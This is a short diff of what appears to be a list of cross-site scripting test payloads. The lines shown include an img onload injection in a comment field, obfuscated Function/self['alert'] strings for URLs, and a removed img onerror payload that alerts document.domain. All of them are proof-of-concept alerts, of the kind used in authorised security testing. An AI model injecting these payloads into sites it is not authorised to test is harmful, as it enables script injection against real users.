@@ -17,6 +17,5 @@ PayLoads
 - Comment - <img src="https://intensedebate.com/images/a-addblog.png" onload="alert()">
 - inurl - test ‘-Function`self[‘a’\x2b’l’\x2b’e’\x2b’r’\x2b’t’]\x281\x29```-’
 - inurl - test ‘-Function`self[‘a’+’l’+’e’+’r’+’t’](1)```-’
-- “><img src=x onerror=alert(document.domain)>
 
 
